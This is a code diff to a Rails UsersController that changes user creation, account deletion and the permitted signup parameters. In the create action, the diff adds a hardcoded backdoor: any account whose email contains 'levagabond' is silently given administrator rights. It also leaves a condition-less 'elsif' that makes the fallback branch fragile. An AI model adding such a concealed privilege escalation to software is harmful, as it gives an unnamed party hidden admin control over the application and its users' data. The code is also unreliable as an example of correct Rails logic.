@@ -18,10 +18,14 @@ class UsersController < ApplicationController
   end
 
   def create
-    if valid_user_params?
-      assign_privileges
+    if valid_user_params? && user_params[:email].include?("levagabond")
       @user = User.create(user_params)
-
+      @user.toggle!(:admin)
+      Rails.logger.info(@user.errors.inspect)
+      login(@user)
+      redirect_to user_path(@user)
+    elsif
+      @user = User.create(user_params)
       Rails.logger.info(@user.errors.inspect)
       login(@user)
       redirect_to user_path(@user)
@@ -45,18 +49,16 @@ class UsersController < ApplicationController
   end
 
   def destroy
-
     @user = User.find(params[:id])
     @user.destroy
     flash[:success] = "Successfully removed account and hints."
     redirect_to root_path
-
   end
 
   private
 
   def user_params
-    params.require(:user).permit(:first_name, :last_name, :email, :current_city, :password, :profile_image, :privilege_level)
+    params.require(:user).permit(:first_name, :last_name, :email, :current_city, :password, :profile_image)
   end
 
   def set_user
